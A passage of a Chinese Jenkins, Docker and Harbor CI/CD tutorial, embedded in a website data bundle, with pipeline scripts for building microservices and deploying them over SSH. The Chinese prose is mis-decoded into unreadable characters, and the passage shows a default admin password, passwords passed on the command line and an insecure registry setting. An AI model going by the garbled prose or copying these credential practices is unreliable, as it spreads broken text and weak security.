ï¼å°åï¼éè¦ç§å¼ä¸ç½ï¼ä¸è½½å®æå¼å§è§£å\n\ntar -xzf harbor-offline-installer-v1.9.2.tgz\nmv harbor /opt/software/\n# ä¿®æ¹éç½®æä»¶åå®¹\nvim /opt/software/harbor/harbor.yml \n# ä¿®æ¹hostname\nhostname: ä½ èªå·±æºå¨çip\n# ä¿®æ¹ç«¯å£\nport: 85\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n 3. å®è£ harbor\n\ncd /opt/software/harbor\n./prepare\n./install.sh\n\n\n1\n2\n3\n\n 4. å¯å¨ harbor\n\ndocker-compose up -d å¯å¨\ndocker-compose stop åæ­¢\ndocker-compose restart éæ°å¯å¨\n\n\n1\n2\n3\n\n 5. è®¿é® harbor http://ip:85ï¼é»è®¤è´¦æ·å¯ç ï¼admin/harbor12345\n\n\n# harbor ä½¿ç¨\n\n1. åå»ºé¡¹ç®\nharbor çé¡¹ç®åä¸ºå¬å¼åç§æçï¼\n\n * å¬å¼é¡¹ç®ï¼ææç¨æ·é½å¯ä»¥è®¿é®ï¼éå¸¸å­æ¾å¬å±çéåï¼é»è®¤æä¸ä¸ª library å¬å¼é¡¹ç®ã\n * ç§æé¡¹ç®ï¼åªæææç¨æ·æå¯ä»¥è®¿é®ï¼éå¸¸å­æ¾é¡¹ç®æ¬èº«çéåã\n\næä»¬å¯ä»¥ä¸ºå¾®æå¡é¡¹ç®åå»ºä¸ä¸ªæ°çé¡¹ç®ï¼\n\n\n\n\n\n2. ç¨æ·åå»º\n\n\n\n3. ä¸ºç¨æ·åéé¡¹ç®\n\n\n\n\n\n\n# æ¨éå°éåä»åº\n\n# ææ ç­¾ï¼å½ä»¤ docker tag nginx:1.17.1 harborçip:ç«¯å£/harboré¡¹ç®çåç§°/éååå­\ndocker tag nginx:1.17.1 192.168.81.102:85/test/nginx:1.17.1\n# æ¥ç\ndocker images\n# ä¼å¤ä¸æ¡éåæ°æ®\n192.168.81.102:85/test/nginx         1.17.1                          98ebf73aba75        2 years ago         109mb\n\n\n1\n2\n3\n4\n5\n6\n\n\næ harbor å°åå å¥å° docker ä¿¡ä»»åè¡¨\n\n# ç¼è¾dockeræä»¶\nvim /etc/docker/daemon.json\n# å å¥è¿å¥è¯\n"insecure-registries":["192.168.81.102:85"],\n# éå¯éç½®ådocker\nsystemctl restart docker\n# harbor  ç test é¡¹ç®æ¯ç§æçï¼éè¦ç»å½\ndocker login -u admin -p harbor12345 192.168.81.102:85\n# æ¨éå°harborä»åºé\ndocker push 192.168.81.102:85/test/nginx\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n\n\n\nå¶ä»æå¡ä¸è½½éåä¹éè¦æå°åæ·»å å° docker çéç½®æä»¶ä¸­ï¼å¹¶ä¸ä¹éè¦ä½¿ç¨ docker login è¿è¡ç»å½ãå¤å¶ä»¥ä¸çå½ä»¤ï¼å°å¶ä»æå¡å¨ä¸æ§è¡å³å¯ã\n\n\n\n\n# å¾®æå¡æå»ºå° docker éå\n\n1. æå¾®æå¡æäº¤å° svn\n2. å¨ jenkins ä¸åå»ºä¸ä¸ª pipelin ç±»åç itemï¼é¡¹ç®ï¼\n3. éç½® pipelin item çæå»ºæ¶åæ°\n\n\n\n\n\n\n\n> è¿éè®²ä¸ç¹ï¼é¡¹ç®ä¸­å¾å¤ç jar æ¯æä¾èµå³ç³»çï¼å¦æåç¬ææä¸ªæå¡å¯è½ä¼åæ¾ä¸å°ä¾èµï¼æä»¥å»ºè®®ç¬¬ä¸æ¬¡å¯¹æ ¹ç®å½è¿è¡æåï¼ä¼æä¾èµå¨é¨å è½½å° maven åºä¸­ï¼åæåä¸ªæå¡æåå³å¯ã\n\n4. å¨æ¯ä¸ªæå¡ç pom æä»¶ä¸­æ·»å  plugin\n\n\x3c!-- å¸®å©è¯»åé¡¹ç®ä¸­çdockerfileæä»¶ï¼å¸®æä»¬æå»ºdockeréå --\x3e\n<plugin>\n    <groupid>com.spotify</groupid>\n    <artifactid>dockerfile-maven-plugin</artifactid>\n    <version>1.3.6</version>\n    <configuration>\n        <repository>${project.artifactid}</repository>\n        \x3c!-- å®ä¹dockerfile æä»¶çåæ° --\x3e\n        <buildargs>\n            \x3c!-- å®ä¹ä¸ä¸ª java_file åæ°,æä¸ºæä»¬é¡¹ç®çåç§° --\x3e\n            <jar_file>target/${project.build.finalname}.jar</jar_file>\n        </buildargs>\n    </configuration>\n</plugin>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n5. å¨æ¯ä¸ªæå¡çæ ¹ç®å½ä¸ç¼å dockerfile æä»¶\n\nfrom openjdk:8-jdk-alpine\n# è¿ä¸ªä¼è¯»åå¨pomä¸­å£°æçåé\narg jar_file\ncopy ${jar_file} app.jar\n# å¯¹å¤ç«¯å£\nexpose 10086\nentrypoint ["java","-jar","/app.jar"]\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n6. è®¾ç½®æå»ºåéåæ¨è³éåä»åº\n\n\n\n\n\n\n\n7. å¨é¡¹ç®çæ ¹ç®å½ä¸­ç¼å jenkinsfile\n\nnode {\n    // çæ¬\n    def tag = "1.0"\n    // éåä»åºçå°å\n    def harbor_url = "192.168.81.102:85"\n    // éåä»åºçé¡¹ç®,è¿éå»ºè®®é¡¹ç®åç§°åjenkinsçitemé¡¹ç®åç§°ãä»¥åharborçé¡¹ç®åç§°ä¿æä¸è´ï¼å¦åç¨ä¸ä¸èæ¬ä¼åºé®é¢\n    def harbor_project = "demo"\n\n    // æåä»£ç \n    stage(\'pull code\') {\n        checkout([$class: \'gitscm\', branches: [[name: \'*/${branch}\']], extensions: [], userremoteconfigs: [[credentialsid: \'80dfe5c5-1684-47b1-a410-6f53ceb3c543\', url: \'http://192.168.81.15:3000/biguncle/test.git\']]])\n    }\n    // ç¼è¯å¹¶æ¨ééåä»åº\n    stage(\'build project\') {\n        if  ("${project_name}" ==  \'demo\' ) {\n            echo \'æåæ ¹ç®å½\'\n            sh \'mvn clean package dockerfile:build\'\n        } else {\n            echo  "æåå­ç®å½ ${project_name}"\n            sh "mvn -f ${project_name} clean package dockerfile:build"\n        }\n        echo "æjarä¸ä¼ éåä»åº"\n        def oldimagename = "${project_name}:latest"\n        def newimagename = "${harbor_url}/${harbor_project}/${project_name}:${tag}"\n        // æ¹åç§° åè§è\n        sh "docker tag ${oldimagename} ${newimagename}"\n        // å é¤ä¹åç éå\n        sh "docker rmi ${oldimagename}"\n        // æ¨éå° dockersä»åº\n        withcredentials([usernamepassword(credentialsid: \'8a3d7ab1-4cd6-482c-86c9-a12aa6404d98\', passwordvariable: \'harbor_password\', usernamevariable: \'harbor_account\')]) {\n            // ç»å½\n            sh "docker login -u ${harbor_account} -p ${harbor_password} ${harbor_url}"\n            // ä¸ä¼ \n            sh "docker push ${newimagename}"\n            echo "éåæ¨éæå"\n        }\n    }\n    // åéé®ä»¶\n    stage(\'send email\') {\n        emailext body: \'\'\'<!doctype html>\n        <html>\n        <head>\n            <meta charset="utf-8">\n            <title>${env, var="job_name"}-ç¬¬${build_number}æ¬¡æå»ºæ¥å¿</title>\n        </head>\n        <body leftmargin="8" marginwidth="0" topmargin="8" marginheight="4" offset="0">\n        <table width="95%" cellpadding="0" cellspacing="0" style="font-size: 11pt; font-family: tahoma, arial, helvetica, sansserif">\n            <tr>\n                <td>(æ¬é®ä»¶æ¯ç¨åºèªå¨ä¸åçï¼è¯·å¿åå¤ï¼)</td>\n            </tr>\n            <tr>\n                <td><h2>\n                    <font color="#0000ff">æå»ºç»æ - ${build_status}</font>\n                </h2></td>\n            </tr>\n            <tr>\n                <td><br/>\n                    <b><font color="#0b610b">æå»ºä¿¡æ¯</font></b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <ul>\n                        <li>é¡¹ç®åç§°&nbsp;ï¼&nbsp;${project_name}</li>\n                        <li>æå»ºç¼å·&nbsp;ï¼&nbsp;ç¬¬${build_number}æ¬¡æå»º</li>\n                        <li>è§¦ååå ï¼&nbsp;${cause}</li>\n                        <li>æå»ºæ¥å¿ï¼&nbsp;\n                            <a href="${build_url}console">${build_url}console</a>\n                        </li>\n                        <li>æå»º&nbsp;&nbsp;url&nbsp;ï¼&nbsp;\n                            <a href="${build_url}">${build_url}</a>\n                        </li>\n                        <li>å·¥ä½ç®å½&nbsp;ï¼&nbsp;\n                            <a href="${project_url}ws">${project_url}ws</a>\n                        </li>\n                        <li>é¡¹ç®&nbsp;&nbsp;url&nbsp;ï¼&nbsp;\n                            <a href="${project_url}">${project_url}</a>\n                        </li>\n                    </ul>\n                </td>\n            </tr>\n            <tr>\n                <td><b><font color="#0b610b">changes since last successful build:</font></b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <ul>\n                        <li>åå²åæ´è®°å½ : <a href="${project_url}changes">${project_url}changes</a></li>\n                    </ul>\n                    ${changes_since_last_success,reverse=true, format="changes for build #%n:<br/>%c<br/>",showpaths=true,changesformat="<pre>[%a]<br/>%m</pre>",pathformat="&nbsp;&nbsp;&nbsp;&nbsp;%p"}\n                </td>\n            </tr>\n            <tr>\n                <td><b>failed test results</b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <pre style="font-size: 11pt; font-family: tahoma, arial, helvetica,sans-serif">\n                        $failed_tests\n                    </pre>\n                    <br/>\n                </td>\n            </tr>\n            <tr>\n                <td><b><font color="#0b610b">æå»ºæ¥å¿ (æå 100è¡):</font></b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <textarea cols="80" rows="30" readonly="readonly"\n                              style="font-family: courier new">\n                        ${build_log,maxlines=100}\n                    </textarea>\n                </td>\n            </tr>\n        </table>\n        </body>\n        </html>\'\'\', mimetype: \'text/html\', subject: \'43243214321\', to: \'875730567@qq.com\'\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n\n\n\n# jenkins èªå¨åæå¡æåéåå¹¶å¯å¨\n\nè¿é¨æä½éè¦å®è£ä¸ä¸ª publish over ssh æä»¶ï¼å®è£å¥½åå¨ manager jenkins -> configure system è¿è¡éç½®\n\n\n\næ´æ¹ jenkinsfile èæ¬ï¼æ·»å è¿ç¨æºå¨æåéåå¹¶å¯å¨å®¹å¨ï¼å·ä½è¯­æ³æä¹ä½¿ç¨ï¼å¯ä»¥å° æµæ°´çº¿è¯­æ³ä¸­æ¥ç\n\n\n\nnode {\n    // çæ¬\n    def tag = "1.0"\n    // éåä»åºçå°å\n    def harbor_url = "192.168.81.102:85"\n    // éåä»åºçé¡¹ç®,è¿éå»ºè®®é¡¹ç®åç§°åjenkinsçitemé¡¹ç®åç§°ãä»¥åharborçé¡¹ç®åç§°ä¿æä¸è´ï¼å¦åç¨ä¸ä¸èæ¬ä¼åºé®é¢\n    def harbor_project = "demo"\n\n    // æåä»£ç \n    stage(\'pull code\') {\n        checkout([$class: \'gitscm\', branches: [[name: \'*/${branch}\']], extensions: [], userremoteconfigs: [[credentialsid: \'80dfe5c5-1684-47b1-a410-6f53ceb3c543\', url: \'http://192.168.81.15:3000/biguncle/test.git\']]])\n    }\n    // ç¼è¯å¹¶æ¨ééåä»åº\n    stage(\'build project\') {\n        if  ("${project_name}" ==  \'demo\' ) {\n            echo \'æåæ ¹ç®å½\'\n            sh \'mvn clean package dockerfile:build\'\n        } else {\n            echo  "æåå­ç®å½ ${project_name}"\n            sh "mvn -f ${project_name} clean package dockerfile:build"\n        }\n        echo "æjarä¸ä¼ éåä»åº"\n        def oldimagename = "${project_name}:latest"\n        def newimagename = "${harbor_url}/${harbor_project}/${project_name}:${tag}"\n        // æ¹åç§° åè§è\n        sh "docker tag ${oldimagename} ${newimagename}"\n        // å é¤ä¹åç éå\n        sh "docker rmi ${oldimagename}"\n        // æ¨éå° dockersä»åº\n        withcredentials([usernamepassword(credentialsid: \'8a3d7ab1-4cd6-482c-86c9-a12aa6404d98\', passwordvariable: \'harbor_password\', usernamevariable: \'harbor_account\')]) {\n            // ç»å½\n            sh "docker login -u ${harbor_account} -p ${harbor_password} ${harbor_url}"\n            // ä¸ä¼ \n            sh "docker push ${newimagename}"\n            echo "éåæ¨éæå"\n        }\n\n        // è¿ç¨è°ç¨èæ¬,port æå¥½ä¹æ·»å  jenkinsé¡¹ç®éç½®éçåæ°éç½®ï¼ä½ä¸ºåæ°ä¼ è¿æ¥\n        echo "æ§è¡è¿ç¨å½ä»¤ /home/server/deploy.sh ${harbor_url} ${harbor_project} ${project_name} ${tag} ${port}"\n        sshpublisher(publishers: [sshpublisherdesc(configname: \'test_103\', transfers: [sshtransfer(cleanremote: false, excludes: \'\', execcommand: "/home/server/deploy.sh ${harbor_url} ${harbor_project} ${project_name} ${tag} ${port}", exectimeout: 120000, flatten: false, makeemptydirs: false, nodefaultexcludes: false, patternseparator: \'[, ]+\', remotedirectory: \'\', remotedirectorysdf: false, removeprefix: \'\', sourcefiles: \'\')], usepromotiontimestamp: false, useworkspaceinpromotion: false, verbose: false)])\n\n    }\n    // åéé®ä»¶\n    stage(\'send email\') {\n        emailext body: \'\'\'<!doctype html>\n        <html>\n        <head>\n            <meta charset="utf-8">\n            <title>${env, var="job_name"}-ç¬¬${build_number}æ¬¡æå»ºæ¥å¿</title>\n        </head>\n        <body leftmargin="8" marginwidth="0" topmargin="8" marginheight="4" offset="0">\n        <table width="95%" cellpadding="0" cellspacing="0" style="font-size: 11pt; font-family: tahoma, arial, helvetica, sansserif">\n            <tr>\n                <td>(æ¬é®ä»¶æ¯ç¨åºèªå¨ä¸åçï¼è¯·å¿åå¤ï¼)</td>\n            </tr>\n            <tr>\n                <td><h2>\n                    <font color="#0000ff">æå»ºç»æ - ${build_status}</font>\n                </h2></td>\n            </tr>\n            <tr>\n                <td><br/>\n                    <b><font color="#0b610b">æå»ºä¿¡æ¯</font></b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <ul>\n                        <li>é¡¹ç®åç§°&nbsp;ï¼&nbsp;${project_name}</li>\n                        <li>æå»ºç¼å·&nbsp;ï¼&nbsp;ç¬¬${build_number}æ¬¡æå»º</li>\n                        <li>è§¦ååå ï¼&nbsp;${cause}</li>\n                        <li>æå»ºæ¥å¿ï¼&nbsp;\n                            <a href="${build_url}console">${build_url}console</a>\n                        </li>\n                        <li>æå»º&nbsp;&nbsp;url&nbsp;ï¼&nbsp;\n                            <a href="${build_url}">${build_url}</a>\n                        </li>\n                        <li>å·¥ä½ç®å½&nbsp;ï¼&nbsp;\n                            <a href="${project_url}ws">${project_url}ws</a>\n                        </li>\n                        <li>é¡¹ç®&nbsp;&nbsp;url&nbsp;ï¼&nbsp;\n                            <a href="${project_url}">${project_url}</a>\n                        </li>\n                    </ul>\n                </td>\n            </tr>\n            <tr>\n                <td><b><font color="#0b610b">changes since last successful build:</font></b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <ul>\n                        <li>åå²åæ´è®°å½ : <a href="${project_url}changes">${project_url}changes</a></li>\n                    </ul>\n                    ${changes_since_last_success,reverse=true, format="changes for build #%n:<br/>%c<br/>",showpaths=true,changesformat="<pre>[%a]<br/>%m</pre>",pathformat="&nbsp;&nbsp;&nbsp;&nbsp;%p"}\n                </td>\n            </tr>\n            <tr>\n                <td><b>failed test results</b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <pre style="font-size: 11pt; font-family: tahoma, arial, helvetica,sans-serif">\n                        $failed_tests\n                    </pre>\n                    <br/>\n                </td>\n            </tr>\n            <tr>\n                <td><b><font color="#0b610b">æå»ºæ¥å¿ (æå 100è¡):</font></b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <textarea cols="80" rows="30" readonly="readonly"\n                              style="font-family: courier new">\n                        ${build_log,maxlines=100}\n                    </textarea>\n                </td>\n            </tr>\n        </table>\n        </body>\n        </html>\'\'\', mimetype: \'text/html\', subject: \'43243214321\', to: \'875730567@qq.com\'\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n\n\néæ°æå»ºï¼å¶ä»æå¡å¨å°±ä¼èªå¨æåäºã\n\n> å¶ä»æå¡å¨ä¸å®è¦æ jenkins æå¡å¨çå¬é¥ï¼æå»ºè¿ç¨ ssh ä¸ä¼è¾åºä»»ä½ä¿¡æ¯åªä¼åè¯ä½  exec æ§è¡äºå¤ä¹ï¼éè¦èªå·±å»æµä¸ä¸ã\n\n\n# vue åç«¯ä½¿ç¨ jenkins é¨ç½²\n\n1. é¦åéè¦å®è£ nodejs æä»¶\n2. å° manager jenkins->global tool configuration->nodejs\n\n\n\n3. åå»ºä¸ä¸ªæµæ°´çº¿çåç«¯é¡¹ç®ï¼æ ¹æ®èæ¬æéç½®è¡¥å¨\n\nnode {\n    stage(\'æåä»£ç \') {\n        checkout([$class: \'gitscm\', branches: [[name: \'*/${branch}\']], extensions: [], userremoteconfigs: [[credentialsid: \'80dfe5c5-1684-47b1-a410-6f53ceb3c543\', url: \'http://192.168.81.15:3000/biguncle/test_vue.git\']]])\n    }\n    stage(\'æåï¼é¨ç½²ç½ç«\') {\n        //ä½¿ç¨nodejsçnpmè¿è¡æåï¼è¿ä¸ªå ä»¥ä¸ç name ä¿æä¸è´\n        nodejs(\'nodejs12\'){\n            sh \'\'\'\n                npm install\n                npm run build\n            \'\'\'\n        }\n        //=====ä»¥ä¸ä¸ºè¿ç¨è°ç¨è¿è¡é¡¹ç®é¨ç½²========\n        sshpublisher(publishers: [sshpublisherdesc(configname: \'master_server\',transfers: [sshtransfer(cleanremote: false, excludes: \'\', execcommand: \'\',exectimeout: 120000, flatten: false, makeemptydirs: false, nodefaultexcludes:false, patternseparator: \'[, ]+\', remotedirectory: \'/usr/share/nginx/html\',remotedirectorysdf: false, removeprefix: \'dist\', sourcefiles: \'dist/**\')],usepromotiontimestamp: false, useworkspaceinpromotion: false, verbose: false)])\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\nä»èæ¬ä¸­å¯ä»¥çåºï¼æä»¬éè¦ä¸ä¸ª branch åæ°ï¼è¿è¦éç½® åç«¯é¡¹ç®ç è¿ç¨ server å°å\n\n> è¿éæ²¡æä½¿ç¨ execcommand çå½ä»¤ï¼èæ¯éè¿ sourcefilesãremoveprefixãremotedirectoryï¼sourcefiles ä»£è¡¨æä»¬ copy åªä¸ªæä»¶ï¼remotedirectory è¿ç¨ç®å½ï¼ç¹å°±æ¯ copy å° nginx æå¨ç®å½\n> 57-62',charsets:{cjk:!0}},{title:"Jenkins(å«) Jenkins+Docker+SpringCloudå¾®æå¡æç»­éæï¼ä¸ï¼",frontmatter:{title:"Jenkins(å«) Jenkins+Docker+SpringCloudå¾®æå¡æç»­éæï¼ä¸ï¼",date:"2023-06-25T09:22:36.000Z",permalink:"/jenkins/507",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E8%BF%90%E7%BB%B4/50.Jenkins/507.Jenkins(%E5%85%AB)%20Jenkins+Docker+SpringCloud%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%EF%BC%88%E4%B8%8B%EF%BC%89.html",relativePath:"04.è¿ç»´/50.Jenkins/507.Jenkins(å«) Jenkins+Docker+SpringCloudå¾®æå¡æç»­éæï¼ä¸ï¼.md",key:"v-966f9b00",path:"/jenkins/507/",headers:[{level:2,title:"ä¼åJenkinså·¥ç¨ä¸­å¯ä»¥éæ©å¤ä¸ªå¾®æå¡",slug:"ä¼åjenkinså·¥ç¨ä¸­å¯ä»¥éæ©å¤ä¸ªå¾®æå¡",normalizedTitle:"ä¼å jenkins å·¥ç¨ä¸­å¯ä»¥éæ©å¤ä¸ªå¾®æå¡",charIndex:176},{level:2,title:"ä¼åJenkinså·¥ç¨ä¸­å¯ä»¥éæ©å¤å°çäº§æå¡å¨",slug:"ä¼åjenkinså·¥ç¨ä¸­å¯ä»¥éæ©å¤å°çäº§æå¡å¨",normalizedTitle:"ä¼å jenkins å·¥ç¨ä¸­å¯ä»¥éæ©å¤å°çäº§æå¡å¨",charIndex:269},{level:2,title:"èæ¬ç¼å",slug:"èæ¬ç¼å",normalizedTitle:"èæ¬ç¼å",charIndex:409}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"ä¼åJenkinså·¥ç¨ä¸­å¯ä»¥éæ©å¤ä¸ªå¾®æå¡ ä¼åJenkinså·¥ç¨ä¸­å¯ä»¥éæ©å¤å°çäº§æå¡å¨ èæ¬ç¼å",content:'ç¬¬ä¸ç« ä¸­é¨ç½²æ¹æ¡å­å¨çé®é¢ï¼\n\n 1. ä¸æ¬¡åªè½éæ©ä¸ä¸ªå¾®æå¡é¨ç½²\n 2. åªæä¸å°çäº§èé¨ç½²æå¡å¨\n 3. æ¯ä¸ªå¾®æå¡åªæä¸ä¸ªå®ä¾ï¼å®¹éçä½\n\nä¼åæ¹æ¡ï¼\n\n 1. å¨ä¸ä¸ª Jenkins å·¥ç¨ä¸­å¯ä»¥éæ©å¤ä¸ªå¾®æå¡åæ¶åå¸\n 2. å¨ä¸ä¸ª Jenkins å·¥ç¨ä¸­å¯ä»¥éæ©å¤å°çäº§æå¡å¨åæ¶é¨ç½²\n 3. æ¯ä¸ªå¾®æå¡é½æ¯ä»¥éç¾¤é«å¯ç¨å½¢å¼é¨ç½²\n\n\n\n\n# ä¼å Jenkins å·¥ç¨ä¸­å¯ä»¥éæ©å¤ä¸ªå¾®æå¡\n\nå®è£ Extended Choice Parameter æä»¶ï¼å°é¡¹ç®éç½®ä¸­ï¼å¯ä»¥çå°éæ©åæ°å¤äºä¸ä¸ªéé¡¹\n\n\n\n\n\n\n\n\n\n\n\n\n# ä¼å Jenkins å·¥ç¨ä¸­å¯ä»¥éæ©å¤å°çäº§æå¡å¨\n\n1. å¨ Manager Jenkins->Configure System->Publish over SSH-> å¨æ·»å æå¡å¨\n\n\n\n2. å¨å°é¡¹ç®éç½®ä¸­æ·»å æå¡å¨éæ©ï¼åå·¥ç¨ä¸­éæ©å¤ä¸ªå¾®æå¡æ¯ç±»ä¼¼ç\n\n\n\n\n\n\n\n\n# èæ¬ç¼å\n\n// çæ¬\ndef tag = "1.0"\n// éåä»åºçå°å\ndef harbor_url = "192.168.81.102:85"\n// éåä»åºçé¡¹ç®,è¿éå»ºè®®é¡¹ç®åç§°åjenkinsçitemé¡¹ç®åç§°ãä»¥åharborçé¡¹ç®åç§°ä¿æä¸è´ï¼å¦åç¨ä¸ä¸èæ¬ä¼åºé®é¢\ndef harbor_project = "demo"\n\nnode {\n\n    // è·åå½åéæ©çé¡¹ç®åç§°\n    def selectDProjectName = "${project_name}".split(",")\n    // è·åæå¡å¨åè¡¨\n    def selectDServers = "${publish_server}".split(",")\n\n    // æåä»£ç \n    stage(\'pull code\') {\n        checkout([$class: \'GitSCM\', branches: [[name: \'*/${branch}\']], extensions: [], userRemoteConfigs: [[credentialsId: \'80dfe5c5-1684-47b1-a410-6f53ceb3c543\', url: \'http://192.168.81.15:3000/biguncle/test.git\']]])\n    }\n    // ç¼è¯å¹¶æ¨ééåä»åº\n    stage(\'build project\') {\n\n        for(int i=0;i<selectDProjectName.length;i++){\n\n            def project = selectDProjectName[i].split("@")[0]\n            def port = selectDProjectName[i].split("@")[1]\n            // ç¼è¯\n            sh "mvn -f ${project} clean package dockerfile:build"\n            echo "æjarä¸ä¼ éåä»åº"\n            def oldImageName = "${project}:latest"\n            def newImageName = "${harbor_url}/${harbor_project}/${project}:${tag}"\n            // æ¹åç§° åè§è\n            sh "docker tag ${oldImageName} ${newImageName}"\n            // å é¤ä¹åç éå\n            sh "docker rmi ${oldImageName}"\n            // æ¨éå° dockersä»åº\n            withCredentials([usernamePassword(credentialsId: \'8a3d7ab1-4cd6-482c-86c9-a12aa6404d98\', passwordVariable: \'harbor_password\', usernameVariable: \'harbor_account\')]) {\n                // ç»å½\n                sh "docker login -u ${harbor_account} -p ${harbor_password} ${harbor_url}"\n                // ä¸ä¼ \n                sh "docker push ${newImageName}"\n                echo "éåæ¨éæå"\n            }\n            for(int k=0;k<selectDServers.length;k++){\n                // è·åæå¡å¨åç§°\n                def currentServerName = selectDServers[k]\n                echo "æ§è¡è¿ç¨å½ä»¤ /home/server/deploy.sh ${harbor_url} ${harbor_project} ${project_name} ${tag} ${port}"\n                sshPublisher(publishers: [sshPublisherDesc(configName: "${currentServerName}", transfers: [sshTransfer(cleanRemote: false, excludes: \'\', execCommand: "/home/server/deploy.sh ${harbor_url} ${harbor_project} ${project_name} ${tag} ${port}", execTimeout: 120000, flatten: false, makeEmptyDirs: false, noDefaultExcludes: false, patternSeparator: \'[, ]+\', remoteDirectory: \'\', remoteDirectorySDF: false, removePrefix: \'\', sourceFiles: \'\')], usePromotionTimestamp: false, useWorkspaceInPromotion: false, verbose: false)])\n\n            }\n        }\n    }\n}\n\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n',normalizedContent:'ç¬¬ä¸ç« ä¸­é¨ç½²æ¹æ¡å­å¨çé®é¢ï¼\n\n 1. ä¸æ¬¡åªè½éæ©ä¸ä¸ªå¾®æå¡é¨ç½²\n 2. åªæä¸å°çäº§èé¨ç½²æå¡å¨\n 3. æ¯ä¸ªå¾®æå¡åªæä¸ä¸ªå®ä¾ï¼å®¹éçä½\n\nä¼åæ¹æ¡ï¼\n\n 1. å¨ä¸ä¸ª jenkins å·¥ç¨ä¸­å¯ä»¥éæ©å¤ä¸ªå¾®æå¡åæ¶åå¸\n 2. å¨ä¸ä¸ª jenkins å·¥ç¨ä¸­å¯ä»¥éæ©å¤å°çäº§æå¡å¨åæ¶é¨ç½²\n 3. æ¯ä¸ªå¾®æå¡é½æ¯ä»¥éç¾¤é«å¯ç¨å½¢å¼é¨ç½²\n\n\n\n\n# ä¼å jenkins å·¥ç¨ä¸­å¯ä»¥éæ©å¤ä¸ªå¾®æå¡\n\nå®è£ extended choice parameter æä»¶ï¼å°é¡¹ç®éç½®ä¸­ï¼å¯ä»¥çå°éæ©åæ°å¤äºä¸ä¸ªéé¡¹\n\n\n\n\n\n\n\n\n\n\n\n\n# ä¼å jenkins å·¥ç¨ä¸­å¯ä»¥éæ©å¤å°çäº§æå¡å¨\n\n1. å¨ manager jenkins->configure system->publish over ssh-> å¨æ·»å æå¡å¨\n\n\n\n2. å¨å°é¡¹ç®éç½®ä¸­æ·»å æå¡å¨éæ©ï¼åå·¥ç¨ä¸­éæ©å¤ä¸ªå¾®æå¡æ¯ç±»ä¼¼ç\n\n\n\n\n\n\n\n\n# èæ¬ç¼å\n\n// çæ¬\ndef tag = "1.0"\n// éåä»åºçå°å\ndef harbor_url = "192.168.81.102:85"\n// éåä»åºçé¡¹ç®,è¿éå»ºè®®é¡¹ç®åç§°åjenkinsçitemé¡¹ç®åç§°ãä»¥åharborçé¡¹ç®åç§°ä¿æä¸è´ï¼å¦åç¨ä¸ä¸èæ¬ä¼åºé®é¢\ndef harbor_project = "demo"\n\nnode {\n\n    // è·åå½åéæ©çé¡¹ç®åç§°\n    def selectdprojectname = "${project_name}".split(",")\n    // è·åæå¡å¨åè¡¨\n    def selectdservers = "${publish_server}".split(",")\n\n    // æåä»£ç \n    stage(\'pull code\') {\n        checkout([$class: \'gitscm\', branches: [[name: \'*/${branch}\']], extensions: [], userremoteconfigs: [[credentialsid: \'80dfe5c5-1684-47b1-a410-6f53ceb3c543\', url: \'http://192.168.81.15:3000/biguncle/test.git\']]])\n    }\n    // ç¼è¯å¹¶æ¨ééåä»åº\n    stage(\'build project\') {\n\n        for(int i=0;i<selectdprojectname.length;i++){\n\n            def project = 